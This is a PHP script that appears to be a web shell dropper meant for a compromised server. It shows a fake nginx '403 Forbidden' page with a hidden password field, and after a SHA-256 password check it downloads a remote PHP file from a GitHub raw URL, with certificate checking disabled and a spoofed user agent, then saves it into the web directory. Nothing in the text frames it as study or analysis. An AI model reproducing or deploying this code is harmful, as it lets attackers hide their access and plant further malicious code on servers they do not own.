<?php
$auth_pass = "b713c03bc5f0632a8172292ef537befce70bdbe3846e8e5fa80a8c6339ccbc98";

function Login() {
    die("<html>
    <title>403 Forbidden</title>
    <center><h1>403 Forbidden</h1></center>
    <hr><center>nginx (You don't have permission access to server / on this server)</center>
    <center><form method='post'><input type='password' name='pass' style='text-align:center;margin:0;margin-top:0px;background-color:#fff;border:1px solid #fff;'></form></center>
    </html>");
}

function VEsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}

if (!empty($auth_pass)) {
    if (isset($_POST['pass']) && hash('sha256', $_POST['pass']) === $auth_pass) {
        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
    }

    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || $_COOKIE[md5($_SERVER['HTTP_HOST'])] !== $auth_pass) {
        Login();
    }
}

$remote_file = "https://raw.githubusercontent.com/soy777/johnygreenwoodsz/main/lotusflower.php";
$local_file = __DIR__ . "/lotusflower.php";

$body = '';

if (function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $remote_file);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");
    $body = curl_exec($ch);
    curl_close($ch);
} else {
    $body = @file_get_contents($remote_file);
}

if (!empty($body)) {
    if (file_put_contents($local_file, $body)) {
        echo "File berhasil diunduh dan disimpan: " . $local_file;
    } else {
        echo "Gagal menyimpan file. Periksa permission folder.";
    }
} else {
    echo "Gagal download file dari GitHub. Periksa URL dan koneksi.";
}
?>
